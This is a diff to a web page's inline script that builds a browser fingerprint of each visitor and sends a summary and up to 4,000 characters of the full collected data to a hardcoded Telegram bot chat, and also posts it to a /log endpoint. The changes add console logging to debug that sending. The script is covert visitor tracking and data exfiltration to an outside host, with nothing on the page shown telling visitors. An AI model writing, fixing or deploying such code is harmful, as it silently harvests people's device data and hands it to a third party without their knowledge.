@@ -50,7 +50,9 @@
     </div>
 
     <script>
+console.log("Script started");
 (async function () {
+console.log("Async function started");
 
     const fp = {};
 
@@ -578,15 +580,20 @@
 
         const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         
+        console.log("Sending to Telegram...");
         fetch(url, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: TELEGRAM_USER_ID,
-                text: summary,
-                parse_mode: "HTML"
+                text: summary
             })
-        }).catch(e => console.log("Telegram send failed"));
+        })
+        .then(r => {
+            console.log("Summary sent:", r.status);
+            return r.json();
+        })
+        .catch(e => console.log("Telegram send failed:", e));
 
         const fullData = JSON.stringify(data, null, 2);
         
@@ -596,10 +603,14 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_USER_ID,
-                    text: `<pre>${fullData.substring(0, 4000)}</pre>`,
-                    parse_mode: "HTML"
+                    text: `<pre>${fullData.substring(0, 4000)}</pre>`
                 })
-            }).catch(e => console.log("Telegram full data send failed"));
+            })
+            .then(r => {
+                console.log("Full data sent:", r.status);
+                return r.json();
+            })
+            .catch(e => console.log("Telegram full data send failed:", e));
         }, 500);
     }
 
@@ -642,8 +653,13 @@
     fp.fingerprint = fingerprint;
     window.fingerprintData = fp;
     
+    console.log("Fingerprint generated:", fingerprint.substring(0, 16));
+    console.log("About to send to Telegram...");
+    
     // Send main data immediately
     sendToTelegram(fp);
+    
+    console.log("SendToTelegram function called");
     try {
         await fetch("/log", {
             method: "POST",
